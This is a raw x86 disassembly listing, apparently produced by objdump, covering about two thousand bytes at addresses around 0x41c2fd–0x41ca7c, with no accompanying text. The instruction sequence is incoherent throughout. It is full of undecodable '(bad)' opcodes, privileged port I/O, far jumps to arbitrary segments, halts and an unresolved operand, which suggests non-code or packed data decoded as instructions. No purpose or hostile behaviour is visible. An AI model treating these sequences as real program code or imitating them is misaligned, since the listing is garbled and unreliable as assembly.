  41c2fd:	push   cs
  41c2fe:	and    eax,0xd3289473
  41c303:	out    dx,eax
  41c304:	lahf   
  41c305:	rcl    bl,1
  41c307:	xchg   BYTE PTR [ebp+edi*4+0x12182996],ch
  41c30e:	mov    ebp,0x578c54
  41c313:	add    BYTE PTR [esi+0x6481fb13],bl
  41c319:	push   edx
  41c31a:	jl     0x41c2bf
  41c31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c31d:	inc    edi
  41c31e:	push   eax
  41c31f:	loop   0x41c36a
  41c321:	in     eax,dx
  41c322:	out    0x2c,eax
  41c324:	mov    WORD PTR [esi+0x24e0000],es
  41c32a:	push   esp
  41c32b:	or     DWORD PTR [edx+ecx*8],edx
  41c32e:	lahf   
  41c32f:	outs   dx,BYTE PTR ds:[esi]
  41c330:	adc    dh,cl
  41c332:	cdq    
  41c333:	(bad)  
  41c334:	loop   0x41c3ab
  41c336:	push   ebp
  41c337:	jo     0x41c3a5
  41c339:	hlt    
  41c33a:	jb     0x41c2f5
  41c33c:	and    al,0x8e
  41c33e:	fs sti 
  41c340:	repz (bad) 
  41c343:	in     al,0xef
  41c345:	mov    dl,0xd8
  41c347:	dec    ebp
  41c348:	retf   0x3479
  41c34b:	scas   eax,DWORD PTR es:[edi]
  41c34c:	fwait
  41c34d:	jp     0x41c3bc
  41c34f:	test   DWORD PTR [ebx],esp
  41c351:	xlat   BYTE PTR ds:[ebx]
  41c352:	mov    cl,ah
  41c354:	mov    ebp,0x31490000
  41c359:	out    0xb7,al
  41c35b:	loopne 0x41c309
  41c35d:	push   ds
  41c35e:	sub    edi,0xffffff80
  41c361:	ins    DWORD PTR es:[edi],dx
  41c362:	add    BYTE PTR [eax],al
  41c364:	aad    0xe3
  41c366:	adc    ebp,ebx
  41c368:	sbb    ebp,DWORD PTR [ecx]
  41c36a:	mov    bh,0xff
  41c36c:	(bad)
  41c36f:	mov    cl,0x2c
  41c371:	ins    DWORD PTR es:[edi],dx
  41c372:	pop    ss
  41c373:	jle    0x41c36f
  41c375:	mov    ah,0x93
  41c377:	sub    eax,0x780090
  41c37c:	add    BYTE PTR [ebx],ah
  41c37e:	out    dx,al
  41c37f:	xchg   esp,eax
  41c380:	in     eax,dx
  41c381:	xchg   edi,eax
  41c382:	test   dx,bp
  41c385:	leave  
  41c386:	fidivr DWORD PTR [ecx]
  41c388:	out    0x5c,al
  41c38a:	sbb    esi,edx
  41c38c:	(bad)  
  41c38d:	ds dec ecx
  41c38f:	ror    BYTE PTR [eax],0x0
  41c392:	add    BYTE PTR [edi+ecx*8+0x1add8f90],ah
  41c399:	push   ebx
  41c39a:	fnsave [ebx+0x8d88]
  41c3a0:	and    dl,cl
  41c3a2:	jmp    0x41c32b
  41c3a4:	outs   dx,DWORD PTR ds:[esi]
  41c3a5:	retf   0xd18e
  41c3a8:	lods   eax,DWORD PTR ds:[esi]
  41c3a9:	dec    esp
  41c3aa:	rol    DWORD PTR [eax],1
  41c3ac:	add    BYTE PTR [ecx],ch
  41c3ae:	maskmovq mm7,(bad)
  41c3af:	idiv   DWORD PTR [esi+eiz*4-0x3d]
  41c3b3:	jle    0x41c41f
  41c3b5:	dec    ebx
  41c3b6:	xor    DWORD PTR [edx],0xfffffffc
  41c3b9:	dec    esi
  41c3ba:	adc    eax,0x1357edb6
  41c3bf:	pop    edi
  41c3c0:	test   DWORD PTR ds:0xed3c2d1,0x6970051b
  41c3ca:	cs pop edi
  41c3cc:	std    
  41c3cd:	enter  0x17,0x0
  41c3d1:	and    eax,0x2450b601
  41c3d6:	and    al,0xf8
  41c3d8:	or     ch,BYTE PTR [eax+0x2d151bd1]
  41c3de:	mov    ?,WORD PTR [edi]
  41c3e0:	mov    ebx,0x98e4f223
  41c3e5:	enter  0x7e,0x0
  41c3e9:	(bad)  
  41c3ea:	fiadd  WORD PTR [eax]
  41c3ec:	add    bh,al
  41c3ee:	adc    al,0x2e
  41c3f0:	jg     0x41c3ba
  41c3f2:	das    
  41c3f3:	add    BYTE PTR [eax],al
  41c3f5:	loop   0x41c3bf
  41c3f7:	data16 add BYTE PTR [eax],al
  41c3fa:	sbb    eax,0x9fbcaf76
  41c3ff:	xchg   ecx,eax
  41c400:	sbb    edi,esp
  41c402:	mov    ecx,0xebe72f68
  41c407:	aam    0xdf
  41c409:	jno    0x41c3b5
  41c40b:	sub    esi,edi
  41c40d:	cmp    eax,0x18c816
  41c412:	add    ah,dh
  41c414:	and    eax,0xc94a58f5
  41c419:	ins    BYTE PTR es:[edi],dx
  41c41a:	iret   
  41c41b:	jb     0x41c3bb
  41c41d:	retf   0xa482
  41c420:	mov    ds,WORD PTR [ecx]
  41c422:	unpcklps xmm3,XMMWORD PTR [edi-0x49fe2b50]
  41c429:	ficom  WORD PTR [edi-0xd14f062]
  41c42f:	fstp   st(1)
  41c431:	pop    edi
  41c432:	jl     0x41c464
  41c434:	xchg   eax,esp
  41c436:	mov    ecx,0x812f1ea5
  41c43b:	mov    ecx,0x4307aea4
  41c440:	fnstsw WORD PTR ds:0x4eeeff45
  41c446:	fstp   DWORD PTR [edx-0x49]
  41c449:	out    0xc,al
  41c44b:	push   ebx
  41c44c:	add    BYTE PTR [eax],al
  41c44e:	sub    DWORD PTR [ecx+0xbfc525],0x18000083
  41c458:	shl    BYTE PTR [ebp+0x4f],cl
  41c45b:	call   0xbda4:0x975eb462
  41c462:	xor    esp,DWORD PTR [esi+0x47]
  41c465:	gs loopne 0x41c457
  41c468:	add    al,0x7a
  41c46a:	add    BYTE PTR [eax],al
  41c46c:	outs   dx,DWORD PTR ds:[esi]
  41c46d:	dec    esi
  41c46e:	adc    esi,DWORD PTR [ebp-0x70]
  41c471:	push   0xffffffcd
  41c473:	mov    ecx,0x478074
  41c478:	add    BYTE PTR [ebx-0x6686773],ah
  41c47e:	pop    esi
  41c47f:	cmp    eax,0x76f6b555
  41c484:	pop    es
  41c485:	mov    ch,BYTE PTR [esi+0x60564dde]
  41c48b:	sbb    ah,BYTE PTR [esi+0xfcccc3]
  41c491:	add    BYTE PTR [eax+ecx*1-0x38f90000],cl
  41c498:	sbb    al,0x8b
  41c49a:	xchg   esp,eax
  41c49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c49c:	cmp    DWORD PTR [ebx+edx*1],0xffffffa2
  41c4a0:	dec    ebx
  41c4a1:	mov    bh,0xfa
  41c4a3:	mov    edi,0x5d9136d5
  41c4a8:	cmc    
  41c4a9:	adc    al,bl
  41c4ab:	dec    ebx
  41c4ac:	and    al,dl
  41c4ae:	popf   
  41c4af:	pop    ecx
  41c4b0:	shl    BYTE PTR [eax+eax*1],0x0
  41c4b4:	jge    0x41c470
  41c4b6:	cmpps  xmm4,xmm0,0xe6
  41c4ba:	xchg   ch,dh
  41c4bc:	fld    DWORD PTR [edi]
  41c4be:	pusha  
  41c4bf:	stos   BYTE PTR es:[edi],al
  41c4c0:	cs arpl WORD PTR ds:[esi+0x2276a3ef],cx
  41c4c8:	add    edi,DWORD PTR [eax-0x3d]
  41c4cb:	adc    BYTE PTR [ebx-0x9],dl
  41c4ce:	(bad)  
  41c4cf:	jg     0x41c4df
  41c4d1:	xchg   esp,eax
  41c4d2:	scas   eax,DWORD PTR es:[edi]
  41c4d3:	je     0x41c4b2
  41c4d5:	ja     0x41c513
  41c4d7:	stc    
  41c4d8:	push   es
  41c4d9:	stc    
  41c4da:	lock sub al,0xa4
  41c4dd:	outs   dx,BYTE PTR ds:[esi]
  41c4de:	mov    ch,0xd
  41c4e0:	leave  
  41c4e1:	cmc    
  41c4e2:	cmp    DWORD PTR [ecx+0x5f],eax
  41c4e5:	pop    ss
  41c4e6:	in     eax,0xe8
  41c4e8:	cmp    dl,BYTE PTR [ebx]
  41c4ea:	and    BYTE PTR [edx-0x2f],bh
  41c4ed:	outs   dx,DWORD PTR ds:[esi]
  41c4ee:	jae    0x41c509
  41c4f0:	add    edx,DWORD PTR [ebx+0x3e6870a1]
  41c4f6:	sahf   
  41c4f7:	aad    0x90
  41c4f9:	push   ebp
  41c4fa:	sbb    edx,DWORD PTR ds:0x84b0dc10
  41c500:	rol    DWORD PTR [eax],cl
  41c502:	add    BYTE PTR [edi-0x2ff45787],bl
  41c508:	movaps xmm3,XMMWORD PTR [ebx+edx*2-0x30]
  41c50d:	xor    DWORD PTR [ecx-0x1],eax
  41c510:	inc    eax
  41c511:	add    BYTE PTR [bx+si],al
  41c514:	imul   ebp,DWORD PTR [esi],0xfffffffa
  41c517:	ss ss pop eax
  41c51a:	mov    esp,0x5bb2f6b5
  41c51f:	(bad)  
  41c520:	(bad)  
  41c521:	mov    ds:0xd363f574,eax
  41c526:	(bad)  
  41c528:	push   ecx
  41c529:	push   0x89d0e29c
  41c52e:	pop    ebp
  41c52f:	mov    al,0xc9
  41c531:	stos   BYTE PTR es:[edi],al
  41c532:	bound  edx,QWORD PTR [edx]
  41c534:	add    ecx,DWORD PTR [si+0xfb]
  41c539:	add    BYTE PTR [ebx],bh
  41c53b:	adc    edx,edx
  41c53d:	pop    eax
  41c53e:	or     bl,BYTE PTR [ecx+ebx*4]
  41c541:	(bad)  
  41c543:	fs jle 0x41c5a2
  41c546:	cmp    eax,0x8a68b469
  41c54b:	and    DWORD PTR [ecx+0x22],ecx
  41c54e:	cmp    esp,DWORD PTR [ecx-0x24]
  41c551:	lods   eax,DWORD PTR ds:[esi]
  41c552:	hlt    
  41c553:	cmc    
  41c554:	xchg   esi,eax
  41c555:	mov    dh,0xc9
  41c557:	inc    ebx
  41c558:	call   0x3b00:0x704499
  41c55f:	fninit 
  41c561:	mov    edx,0x18ece875
  41c566:	inc    eax
  41c567:	cmp    eax,0x67420000
  41c56c:	daa    
  41c56d:	std    
  41c56e:	cmp    DWORD PTR [eax],ebx
  41c570:	inc    esi
  41c571:	pop    ebx
  41c572:	mov    dl,0x84
  41c574:	out    0x0,al
  41c576:	add    BYTE PTR [ebp+0xdaa32bb],dl
  41c57c:	jecxz  0x41c585
  41c57e:	adc    DWORD PTR [esi],ebx
  41c580:	sti    
  41c581:	inc    esp
  41c582:	xchg   esi,eax
  41c583:	add    BYTE PTR [eax],al
  41c585:	jp     0x41c507
  41c587:	ins    BYTE PTR es:[edi],dx
  41c588:	add    BYTE PTR [eax],al
  41c58a:	bound  ebp,QWORD PTR [edx-0x386c8156]
  41c590:	push   ds
  41c591:	imul   DWORD PTR [edx-0x52]
  41c594:	mov    ds:0x6df75177,eax
  41c599:	test   BYTE PTR [esi+0x0],dl
  41c59c:	add    ah,dl
  41c59e:	jnp    0x41c560
  41c5a0:	and    al,BYTE PTR [eax]
  41c5a2:	add    BYTE PTR [ecx-0x64a8dfe5],dl
  41c5a8:	sbb    ch,dh
  41c5aa:	or     BYTE PTR [ebx+0x0],cl
  41c5ad:	add    BYTE PTR [edx+edi*2+0x0],al
  41c5b1:	add    dl,dh
  41c5b3:	xor    DWORD PTR [edx+0x12],eax
  41c5b6:	sub    ebx,ecx
  41c5b8:	add    al,0x20
  41c5ba:	add    BYTE PTR [eax],al
  41c5bc:	ret    
  41c5bd:	loopne 0x41c608
  41c5bf:	xor    cl,bh
  41c5c1:	dec    ecx
  41c5c2:	inc    edi
  41c5c3:	call   0x128bee2f
  41c5c8:	shl    BYTE PTR [ebx+0xad5b0b6],1
  41c5ce:	mov    al,ah
  41c5d0:	add    BYTE PTR [eax],al
  41c5d2:	mov    eax,0x79363b26
  41c5d7:	or     DWORD PTR [esi],ebp
  41c5d9:	nop
  41c5da:	pause  
  41c5dc:	mov    ebp,0xf5d35a56
  41c5e1:	out    0x55,al
  41c5e3:	sub    BYTE PTR [esi],bl
  41c5e5:	repnz stc 
  41c5e7:	add    BYTE PTR [eax+0x0],al
  41c5ea:	add    BYTE PTR [ebx+0x668cf51],dl
  41c5f0:	shr    cl,0x0
  41c5f3:	add    BYTE PTR [ebp+0x4c14a431],cl
  41c5f9:	in     al,0x0
  41c5fb:	add    BYTE PTR [edx],dl
  41c5fd:	mov    edx,0x21ad822
  41c602:	mov    bl,0x17
  41c604:	xchg   DWORD PTR [bx+di-0x20],ebx
  41c608:	rol    DWORD PTR ds:0xea165645,0xd8
  41c60f:	jmp    FWORD PTR [ebp+0x11c8df]
  41c615:	add    BYTE PTR [eax],dl
  41c617:	(bad)  
  41c618:	js     0x41c5eb
  41c61a:	adc    BYTE PTR [edi-0x55c5cfee],0x6b
  41c621:	hlt    
  41c622:	jmp    0xf235:0x6385bc96
  41c629:	lahf   
  41c62a:	xchg   DWORD PTR [ebx+ecx*1],eax
  41c62d:	add    BYTE PTR [eax],al
  41c62f:	add    al,0x30
  41c631:	add    BYTE PTR [eax],al
  41c633:	cmp    ebp,edi
  41c635:	cmp    ebx,esi
  41c637:	dec    ebp
  41c638:	jle    0x41c6b2
  41c63a:	or     eax,0x8bcd7b8e
  41c63f:	jns    0x41c5c2
  41c641:	out    0xc9,al
  41c643:	and    ebx,DWORD PTR [edx-0x79]
  41c646:	nop
  41c647:	push   es
  41c648:	mov    DWORD PTR [esi-0x6aa0b0f1],esp
  41c64e:	cmp    al,0x14
  41c650:	sub    eax,0x94889df0
  41c655:	add    BYTE PTR [eax],al
  41c657:	clc    
  41c658:	sbb    ah,BYTE PTR [edi]
  41c65a:	aaa    
  41c65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c65c:	or     eax,0xae8f8217
  41c661:	mov    cl,0xa6
  41c663:	jl     0x9e41c689
  41c669:	xchg   edi,eax
  41c66a:	dec    ebp
  41c66b:	sbb    BYTE PTR [ebx-0x10],cl
  41c66e:	pop    ss
  41c66f:	add    DWORD PTR [edi-0x36b46417],0x6dc99cef
  41c679:	fidivr DWORD PTR [ecx+0x38]
  41c67c:	je     0x41c63c
  41c67e:	pushf  
  41c67f:	dec    edi
  41c680:	repnz and BYTE PTR [edi-0x31],bh
  41c684:	mov    bh,0xdc
  41c686:	push   ss
  41c687:	leave  
  41c688:	mov    dh,0x12
  41c68a:	scas   eax,DWORD PTR es:[edi]
  41c68b:	aad    0x29
  41c68d:	push   edx
  41c68e:	dec    BYTE PTR [ebp-0x226c6419]
  41c694:	xchg   edi,eax
  41c695:	jmp    ebp
  41c697:	xchg   al,bh
  41c699:	push   ecx
  41c69a:	sub    cl,BYTE PTR [ebp+0x66cf7761]
  41c6a0:	mov    cl,0x7b
  41c6a2:	ret    
  41c6a3:	lds    ebp,FWORD PTR ds:0xcba3338b
  41c6a9:	retf   
  41c6aa:	in     eax,0x8d
  41c6ac:	fwait
  41c6ad:	pop    esp
  41c6ae:	fcom   st(7)
  41c6b0:	pushf  
  41c6b1:	sbb    cl,ch
  41c6b3:	mov    eax,ds:0x9c328578
  41c6b8:	sbb    edi,ebp
  41c6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6bb:	rcr    bl,cl
  41c6bd:	and    BYTE PTR [esi+0x14308d92],bh
  41c6c3:	neg    DWORD PTR [edx-0x579d040c]
  41c6c9:	(bad)  
  41c6ca:	mov    WORD PTR [edi-0x786d0000],gs
  41c6d0:	inc    eax
  41c6d1:	pop    esp
  41c6d2:	add    BYTE PTR [eax],al
  41c6d4:	ins    BYTE PTR es:[edi],dx
  41c6d5:	test   BYTE PTR [edx+0x0],ah
  41c6d8:	add    dh,al
  41c6da:	mov    gs,WORD PTR [esi]
  41c6dc:	dec    ecx
  41c6dd:	ins    DWORD PTR es:[edi],dx
  41c6de:	icebp  
  41c6df:	xchg   ah,al
  41c6e1:	ja     0x41c6e3
  41c6e3:	add    BYTE PTR [edx+0x50],ch
  41c6e6:	pop    edx
  41c6e7:	addr16 cmc 
  41c6e9:	sbb    al,0x2e
  41c6eb:	fcomip st,st(6)
  41c6ed:	mov    ecx,0x261d32c3
  41c6f2:	pop    ds
  41c6f3:	(bad)  [esi+0x4af68d98]
  41c6fa:	xor    al,0xfd
  41c6fc:	cmp    eax,esp
  41c6fe:	ret    0x46ac
  41c701:	xor    edx,DWORD PTR [eax-0x4f]
  41c704:	mov    edx,0xd600
  41c709:	out    dx,eax
  41c70a:	add    bl,BYTE PTR ds:0xc0545460
  41c710:	mov    ebx,0x9dfa0000
  41c715:	test   BYTE PTR [eax+0x5b6a0000],ah
  41c71b:	xchg   ebx,eax
  41c71c:	pop    ds
  41c71d:	call   0x4960a1ab
  41c722:	cmp    DWORD PTR [edi+0x75e78acd],edx
  41c728:	in     eax,dx
  41c729:	lahf   
  41c72a:	xor    ecx,ebp
  41c72c:	pop    eax
  41c72d:	cmp    esp,DWORD PTR [ebp-0x130a7df3]
  41c733:	cli    
  41c734:	int3   
  41c735:	push   edx
  41c736:	add    BYTE PTR [eax],al
  41c738:	std    
  41c739:	jecxz  0x41c7a4
  41c73b:	adc    al,0xad
  41c73d:	xor    DWORD PTR [ecx],eax
  41c73f:	push   ebx
  41c740:	sbb    ah,BYTE PTR [edi]
  41c742:	cmp    BYTE PTR [esi+0x4d06e7e5],0x85
  41c749:	adc    al,0x35
  41c74b:	jnp    0x41c71d
  41c74d:	fld    st(7)
  41c74f:	iret   
  41c750:	ss out 0x83,eax
  41c753:	(bad)  
  41c754:	mov    ebp,0x4f84c54d
  41c759:	add    BYTE PTR [eax],al
  41c75b:	jp     0x41c716
  41c75d:	pop    esi
  41c75e:	lods   eax,DWORD PTR ds:[esi]
  41c75f:	mov    eax,ds:0xde01e636
  41c764:	ficomp DWORD PTR [eax+0xc84428]
  41c76a:	add    BYTE PTR [eax-0x66ffff26],al
  41c770:	jne    0x41c75f
  41c772:	(bad)  
  41c773:	mov    esp,0xe78b52e3
  41c778:	add    DWORD PTR [ecx],ecx
  41c77a:	fiadd  WORD PTR [ebp-0x3919d973]
  41c780:	jns    0x41c7c9
  41c782:	aas    
  41c783:	push   eax
  41c784:	(bad)  
  41c786:	jmp    0xc81a:0x21090e9c
  41c78d:	enter  0x0,0x2
  41c791:	pop    esi
  41c792:	call   0xb8e67e41
  41c797:	mov    eax,ecx
  41c799:	jb     0x41c72b
  41c79b:	and    edx,esp
  41c79d:	or     edi,edi
  41c79f:	jmp    0x41c771
  41c7a1:	iret   
  41c7a2:	push   ds
  41c7a3:	sbb    al,0xd1
  41c7a5:	cld    
  41c7a6:	jmp    0x335e:0xeca0736c
  41c7ad:	xor    eax,0xcf3906d7
  41c7b2:	xor    BYTE PTR [ecx-0x4ee3008a],ch
  41c7b8:	inc    esp
  41c7b9:	leave  
  41c7ba:	add    BYTE PTR [eax],al
  41c7bc:	push   ebx
  41c7bd:	fisttp DWORD PTR [ebx+0x59c0ac]
  41c7c3:	add    BYTE PTR [ecx+0x4a],bl
  41c7c6:	push   eax
  41c7c7:	xchg   edx,eax
  41c7c8:	aam    0xba
  41c7ca:	mov    cl,0x8
  41c7cc:	xor    DWORD PTR [eax],eax
  41c7ce:	add    BYTE PTR [ecx+esi*4-0x1a],dl
  41c7d2:	add    al,0x16
  41c7d4:	add    BYTE PTR [eax],al
  41c7d6:	xchg   esi,eax
  41c7d7:	outs   dx,BYTE PTR ds:[esi]
  41c7d8:	test   eax,0x6f8f7121
  41c7dd:	gs jb  0x41c83f
  41c7e0:	sub    eax,0x921f705a
  41c7e5:	daa    
  41c7e6:	fimul  WORD PTR [ebx+0x64b08afd]
  41c7ec:	fwait
  41c7ed:	xchg   edx,eax
  41c7ee:	mov    esi,0x8f679779
  41c7f3:	xchg   BYTE PTR [eax],dh
  41c7f5:	adc    WORD PTR [edx+0x23],dx
  41c7f9:	(bad)  
  41c7fa:	popa   
  41c7fb:	rcl    bl,1
  41c7fd:	mov    edx,ecx
  41c7ff:	dec    edi
  41c800:	mov    ecx,ss
  41c802:	add    BYTE PTR [eax],al
  41c804:	adc    DWORD PTR [eax+0x60],ebp
  41c807:	fnsave [edx+0x676ca442]
  41c80d:	stos   DWORD PTR es:[edi],eax
  41c80e:	jecxz  0x41c810
  41c810:	or     BYTE PTR [eax],al
  41c812:	add    BYTE PTR ds:0xaee15be3,dl
  41c818:	xchg   ebp,eax
  41c819:	mov    dl,bh
  41c81b:	add    BYTE PTR [eax],al
  41c81d:	pop    ecx
  41c81e:	es or  eax,0x7b2a8e55
  41c824:	inc    ebp
  41c825:	dec    ebx
  41c826:	add    BYTE PTR [esi],ch
  41c828:	add    BYTE PTR [eax],al
  41c82a:	(bad)  
  41c82b:	je     0x41c7bb
  41c82d:	cmp    BYTE PTR [eax-0x35fffff7],al
  41c833:	fistp  DWORD PTR ds:0xd93d41bf
  41c839:	mov    dh,bl
  41c83b:	add    BYTE PTR [eax],al
  41c83d:	bound  esp,QWORD PTR [ebx+0x96407c]
  41c843:	add    BYTE PTR [eax+0x6b62bdbc],ah
  41c849:	mov    ch,0xdb
  41c84b:	(bad)  
  41c84c:	lods   eax,DWORD PTR ds:[esi]
  41c84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c84e:	mov    al,ds:0xa3b9e6ac
  41c853:	jns    0x41c898
  41c855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c856:	lds    eax,FWORD PTR [eax+0x7f]
  41c859:	add    BYTE PTR [eax],al
  41c85b:	test   eax,0x168ef37e
  41c860:	les    ebp,FWORD PTR [edx+0x5f460000]
  41c866:	fidiv  DWORD PTR [ebx+0x22]
  41c869:	lds    edi,FWORD PTR [ebx+0x71]
  41c86c:	pop    ecx
  41c86d:	xchg   ebp,eax
  41c86e:	test   al,0xed
  41c870:	add    al,0x46
  41c872:	add    BYTE PTR [eax],al
  41c874:	inc    esi
  41c875:	das    
  41c876:	or     DWORD PTR [edx-0x1eb4024b],0xffffffa7
  41c87d:	addr16 pop es
  41c87f:	push   0xffffff91
  41c881:	call   FWORD PTR [edx-0x5a]
  41c884:	sub    DWORD PTR [ecx-0x6cf38bfb],ebp
  41c88a:	add    BYTE PTR [eax],al
  41c88c:	pop    ecx
  41c88d:	out    dx,eax
  41c88e:	out    dx,al
  41c88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c890:	mov    DWORD PTR [ecx-0x1d17710f],0xec202718
  41c89a:	xchg   DWORD PTR [eax],eax
  41c89c:	add    eax,0x3b840000
  41c8a1:	add    BYTE PTR [eax],al
  41c8a3:	sub    esi,ecx
  41c8a5:	mov    dh,0xbf
  41c8a7:	(bad)  
  41c8a8:	fdivr  st(4),st
  41c8aa:	jae    0x41c83b
  41c8ac:	inc    edi
  41c8ad:	mov    al,0xd7
  41c8af:	icebp  
  41c8b0:	leave  
  41c8b1:	jl     0x41c8d8
  41c8b3:	dec    esp
  41c8b4:	xor    BYTE PTR [eax],al
  41c8b6:	add    BYTE PTR [ebp+0x1b],ch
  41c8b9:	pop    esp
  41c8ba:	sbb    al,0xdc
  41c8bc:	xor    esi,edx
  41c8be:	shr    esp,0x4a
  41c8c1:	test   eax,0x4c8aaed
  41c8c6:	add    BYTE PTR [eax],al
  41c8c8:	loop   0x41c86b
  41c8ca:	ret    0xae30
  41c8cd:	dec    edx
  41c8ce:	jmp    0xd300:0x944c31
  41c8d5:	mov    DWORD PTR [esi-0x500f138c],esi
  41c8db:	xor    bl,bl
  41c8dd:	dec    ecx
  41c8de:	pop    edi
  41c8df:	jecxz  0x41c87d
  41c8e1:	adc    BYTE PTR [edx+0xa380000],0xf
  41c8e8:	fwait
  41c8e9:	jb     0x41c8a7
  41c8eb:	cld    
  41c8ec:	repz ficom WORD PTR [eax-0x71dcb20d]
  41c8f3:	cwde   
  41c8f4:	xchg   edi,eax
  41c8f5:	inc    edi
  41c8f6:	mov    ss,ebx
  41c8f8:	ds dec esp
  41c8fa:	add    DWORD PTR [eax],0x0
  41c8fd:	in     al,dx
  41c8fe:	xlat   BYTE PTR ds:[ebx]
  41c8ff:	jl     0x9a41c922
  41c905:	dec    eax
  41c906:	popa   
  41c907:	add    BYTE PTR [eax],al
  41c909:	fiadd  DWORD PTR [esi-0x4c]
  41c90c:	xor    al,0x99
  41c90e:	cmc    
  41c90f:	cmp    ebx,edi
  41c911:	inc    ecx
  41c912:	es jns 0x41c8d5
  41c915:	or     al,0x0
  41c917:	add    BYTE PTR [edx+0x78],cl
  41c91a:	adc    al,cl
  41c91c:	leave  
  41c91d:	add    BYTE PTR [eax],al
  41c91f:	(bad)  
  41c920:	pop    ds
  41c921:	addr16 test eax,0xd82e1da
  41c927:	test   BYTE PTR [edx],dl
  41c929:	add    BYTE PTR [eax],al
  41c92b:	mov    dh,0xa0
  41c92d:	jle    0x41c969
  41c92f:	sbb    eax,0xe6bde095
  41c934:	and    dh,dl
  41c936:	jno    0x41c964
  41c938:	icebp  
  41c939:	fiadd  DWORD PTR [ecx+edx*8+0x201e0000]
  41c940:	jne    0x41c975
  41c942:	dec    esi
  41c943:	nop
  41c944:	dec    eax
  41c945:	or     BYTE PTR [eax],al
  41c947:	add    BYTE PTR [edi],al
  41c949:	xchg   ebp,eax
  41c94a:	sub    BYTE PTR [ecx+0x15],0x55
  41c94e:	pop    ebp
  41c94f:	pop    eax
  41c950:	cli    
  41c951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c952:	push   ebp
  41c953:	xchg   ebx,eax
  41c954:	out    0x7c,eax
  41c956:	xor    eax,0x5fcb94e1
  41c95b:	icebp  
  41c95c:	ds out dx,al
  41c95e:	leave  
  41c95f:	mov    edx,0xe7688ddb
  41c964:	lea    esi,[edx]
  41c966:	pop    ecx
  41c967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c968:	shr    DWORD PTR [ecx-0x2607b090],1
  41c96e:	lods   eax,DWORD PTR ds:[esi]
  41c96f:	lds    edx,FWORD PTR [ecx]
  41c971:	mov    eax,ds:0x9c29d1ca
  41c976:	jle    0x41c989
  41c978:	xor    dl,BYTE PTR [esi+0x2b]
  41c97b:	sub    al,0x45
  41c97d:	addr16 call 0x7596a051
  41c983:	xor    esp,esi
  41c985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c986:	ror    BYTE PTR [esi-0x6888c22d],1
  41c98c:	shr    DWORD PTR [edx+0x15443d],1
  41c992:	add    BYTE PTR [ecx],ch
  41c994:	or     eax,0x610e610b
  41c999:	addr16 jno 0x41c9d7
  41c99c:	ret    0xa905
  41c99f:	hlt    
  41c9a0:	push   0x308c
  41c9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a6:	inc    esp
  41c9a7:	test   DWORD PTR [eax],eax
  41c9a9:	add    BYTE PTR [edi-0x5f90174f],dh
  41c9af:	jmp    0x7445:0x534629e2
  41c9b6:	inc    ecx
  41c9b7:	adc    DWORD PTR [esi+0x28],ecx
  41c9ba:	mov    WORD PTR [ecx+0x72d20000],gs
  41c9c0:	pusha  
  41c9c1:	push   eax
  41c9c2:	lea    esi,fs:0x87dbbf9
  41c9c9:	add    BYTE PTR ss:[eax],al
  41c9cc:	add    edi,esi
  41c9ce:	dec    edi
  41c9cf:	popa   
  41c9d0:	outs   dx,BYTE PTR ds:[esi]
  41c9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d2:	call   0x7c79:0x70246e3d
  41c9d9:	sbb    esp,ebp
  41c9db:	pop    eax
  41c9dc:	das    
  41c9dd:	adc    al,0x93
  41c9df:	repnz adc DWORD PTR [eax+eiz*2+0x10],0x3b4c52
  41c9e8:	add    BYTE PTR [ebp-0x3a],dl
  41c9eb:	jg     0x41c9cb
  41c9ed:	fidiv  WORD PTR [esi+0x43]
  41c9f0:	lds    edi,FWORD PTR [eax+edi*1+0x66]
  41c9f4:	mov    ecx,0x2619aac9
  41c9f9:	mov    ebx,edi
  41c9fb:	mov    ds:0x5d9d93f2,al
  41ca00:	mov    ebx,0xac78eabf
  41ca05:	(bad)
  41ca08:	test   eax,0xa935e37e
  41ca0d:	aad    0xef
  41ca0f:	rcr    DWORD PTR [edi],cl
  41ca11:	mov    edx,DWORD PTR [esi+0x27ee316d]
  41ca17:	aad    0xc4
  41ca19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca1a:	add    BYTE PTR [eax],al
  41ca1c:	inc    esi
  41ca1d:	fsincos 
  41ca1f:	cmc    
  41ca20:	jno    0x41ca3a
  41ca22:	sbb    bl,BYTE PTR [esi-0x61]
  41ca25:	push   ecx
  41ca26:	fisub  WORD PTR [ebx+0x37]
  41ca29:	push   edx
  41ca2a:	push   0x307a335a
  41ca2f:	data16 js 0x41ca91
  41ca32:	adc    eax,esp
  41ca34:	retf   
  41ca35:	add    BYTE PTR [eax],al
  41ca37:	in     eax,dx
  41ca38:	jg     0x41ca54
  41ca3a:	and    esp,DWORD PTR [ebx-0x278e4e84]
  41ca40:	in     al,0xd
  41ca42:	fwait
  41ca43:	and    BYTE PTR [esi+0x5e],cl
  41ca46:	jl     0x41ca0e
  41ca48:	add    ebp,0xfffffff5
  41ca4b:	push   esp
  41ca4c:	fwait
  41ca4d:	pop    ebx
  41ca4e:	adc    edi,DWORD PTR [edi-0x65]
  41ca51:	nop
  41ca52:	jb     0x41c9f8
  41ca54:	sbb    esp,DWORD PTR [eax+0x4a9b39a5]
  41ca5a:	shr    edi,1
  41ca5c:	ds sbb ebp,0x39
  41ca60:	int    0xb5
  41ca62:	int3   
  41ca63:	and    al,BYTE PTR [eax]
  41ca65:	add    BYTE PTR [esi-0x46699842],ch
  41ca6b:	pop    esp
  41ca6c:	pop    ebx
  41ca6d:	in     eax,dx
  41ca6e:	outs   dx,BYTE PTR ds:[esi]
  41ca6f:	mov    dh,BYTE PTR [eax]
  41ca71:	sub    eax,ebp
  41ca73:	sbb    eax,0x98f6e378
  41ca78:	aaa    
  41ca79:	iret   
  41ca7a:	fild   QWORD PTR [ecx]
  41ca7c:	mov    edx,0x29ec3ca4
